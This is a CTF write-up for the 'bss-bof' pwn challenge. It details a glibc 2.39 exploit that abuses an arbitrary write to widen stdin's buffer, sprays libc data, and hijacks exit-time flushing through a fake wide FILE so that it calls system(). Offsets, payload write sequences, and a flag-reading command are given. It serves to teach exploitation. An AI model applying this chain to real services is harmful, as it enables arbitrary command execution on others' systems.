---
title: "bss-bof writeup"
description: "The exploit is the same core idea as `stack-bof`: the useful bug is not the final `gets()` alone, but the pair:"
event: "TKB CTF"
year: 2025
category: pwn
tags: ["pwn","fsop","docker"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "tkbctf/bss-bof"
featured: false
flagsHidden: false
---

> Imported from [tkbctf/bss-bof](https://github.com/R3izorr/CTF_writeup/tree/main/tkbctf/bss-bof).

# bss-bof writeup

## TL;DR

The exploit is the same core idea as `stack-bof`: the useful bug is not the final `gets()` alone, but the pair:

```c
read(0, &dest, 8);
read(0, dest, 8);
```

That gives one 8-byte arbitrary write. With the leaked `printf` pointer we recover the libc base, use the write to enlarge `stdin`'s unbuffered `_shortbuf` window, and then turn the final `gets(buf)` into a large libc `.data` spray. From there we do FSOP by overwriting `_IO_list_all` and building a fake wide `FILE` object that reaches `system()` during exit-time flushing.

The difference from `stack-bof` is only that `buf` lives in `.bss`:

```c
char buf[8];
```

That means the final `gets()` is not a stack-smash primitive at all, but the intended solve still comes from abusing `stdin`.

## Challenge source

```c
char buf[8];

int main() {
  uint64_t *dest = 0;
  printf("printf: %p\n", printf);

  read(0, &dest, 8);
  read(0, dest, 8);

  gets(buf);
}

__attribute__((constructor)) void setup() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
}
```

Protections:

- Full RELRO
- Stack canary
- NX
- PIE
- SHSTK
- IBT

## Why the arbitrary write matters

This sequence:

```c
read(0, &dest, 8);
read(0, dest, 8);
```

lets us choose a pointer and then write 8 bytes to it. So we get one arbitrary 8-byte write before `gets()` runs.

The printed `printf` address gives a libc leak:

```python
printf_addr = leak
libc_base = printf_addr - 0x60100
```

With that, the libc data segment is fully known.

## Why `stdin` is still the target

`setup()` makes `stdin` unbuffered:

```c
setvbuf(stdin, NULL, _IONBF, 0);
```

So glibc uses the internal 1-byte `_shortbuf` inside `_IO_2_1_stdin_`.

The arbitrary write changes:

- `stdin->_IO_buf_end`

but leaves:

- `stdin->_IO_buf_base`

alone.

That makes glibc believe `stdin` has a much larger readable buffer starting from `_shortbuf`. When `gets()` refills `stdin`, the data lands in libc `.data` instead of the program's `.bss`.

## Docker runtime

The Dockerfile uses Ubuntu 24.04, so the relevant runtime files were extracted first:

- `libc.so.6`
- `ld-linux-x86-64.so.2`

The copied libc is:

```text
GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.
```

Offsets used by the solve:

```python
PRINTF_OFF      = 0x60100
STDIN_OFF       = 0x2038E0
STDIN_WIDE_OFF  = 0x2039C0
FILE_JUMPS_OFF  = 0x202030
WFILE_JUMPS_OFF = 0x202228
LIST_ALL_OFF    = 0x2044C0
LOCK_OFF        = 0x205720
SYSTEM_OFF      = 0x58750
```

Spray layout:

```python
FAKE_OFF      = 0x204700
WIDE_OFF      = 0x204800
FAKE_LOCK_OFF = 0x204900
WVTABLE_OFF   = 0x204A00
END_OFF       = 0x204B00
```

## Spray plan

The `_shortbuf` byte used by the refill starts at:

```python
start = stdin + 0x83
```

The one arbitrary write changes:

```python
stdin + 0x40  # _IO_buf_end
```

to:

```python
libc_base + 0x204b00
```

The spray starts with `'\n'`:

```python
spray[0] = 0x0A
```

That makes `gets()` return immediately, while the refill has already copied the rest of our payload into libc `.data`.

## Preserving stdin

Because the spray stomps over the live `stdin` object, we keep the fields `gets()` still needs:

```python
put(start + 5,  p64(libc_base + LOCK_OFF))
put(start + 13, p64(0xffffffffffffffff))
put(start + 29, p64(libc_base + STDIN_WIDE_OFF))
put(start + 85, p64(libc_base + FILE_JUMPS_OFF))
```

## FSOP path

After the spray lands:

1. Overwrite `_IO_list_all` with the address of our fake stream.
2. Build a fake `FILE` inside the sprayed libc `.data`.
3. Build matching fake `wide_data` and a fake wide vtable.
4. Set the fake wide vtable slot at `+0x68` to `system`.

Key writes:

```python
put(libc_base + LIST_ALL_OFF, p64(fake))

put(fake + 0x00, command + b"\x00")
put(fake + 0xA0, p64(wide))
put(fake + 0xD8, p64(libc_base + WFILE_JUMPS_OFF))

put(wide + 0x20, p64(8))
put(wide + 0xE0, p64(wvtable))

put(wvtable + 0x68, p64(libc_base + SYSTEM_OFF))
```

At process exit, glibc flushes `_IO_list_all`, reaches the fake wide stream, and eventually calls that function pointer with `rdi = fake`. Since the beginning of the fake `FILE` is our command string, this becomes:

```c
system(fake);
```

## Running the solve

Local process with the extracted runtime:

```bash
python3 exploit.py
```

Test with a harmless command:

```bash
CMD='echo TEST' python3 exploit.py
```

Against a local or remote listener:

```bash
HOST=127.0.0.1 PORT=5000 python3 exploit.py REMOTE
```

Default command:

```bash
echo /f*;cat /f*
```

That prints the renamed flag path first and then the flag contents.

